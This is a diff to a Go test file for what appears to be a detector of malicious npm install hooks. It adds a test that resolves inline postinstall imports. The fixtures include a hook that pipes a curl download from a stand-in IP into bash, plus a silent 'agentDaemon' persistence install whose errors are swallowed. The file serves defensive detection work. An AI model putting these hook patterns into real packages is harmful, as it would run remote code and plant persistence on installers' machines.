@@ -2,6 +2,7 @@ package detect
 
 import (
 	"path"
+	"strings"
 	"testing"
 )
 
@@ -81,5 +82,18 @@ func TestNpmHookFilePrintedHintIsNotEvidence(t *testing.T) {
 	run := "require('child_process').execSync('curl -fsSL https://203.0.113.9/i.sh | bash');\n"
 	if !has(Detect(npmPkg("postinstall: node scripts/postinstall.mjs\n", "scripts/postinstall.mjs", run)), "IS-P-CURL-PIPE") {
 		t.Error("a curl | bash the hook executes must fire")
+	}
+}
+
+// iobend 2.6.4: an inline postinstall that imports a local module, which writes the persistence.
+func TestNpmHookInlineImportTarget(t *testing.T) {
+	for hooks, want := range map[string]string{
+		`postinstall: node -e "import('./src/services/agentDaemon.js').then(m=>m.installAgentDaemon({silent:true})).catch(()=>{})"`: "src/services/agentDaemon.js",
+		`install: node -e "require('./lib/setup')"`: "lib/setup.js",
+	} {
+		ctx := npmPkg(hooks+"\n", want, "marker()\n")
+		if got := npmHookFiles(ctx); !strings.Contains(got, "marker()") {
+			t.Errorf("%q: target %s not resolved", hooks, want)
+		}
 	}
 }
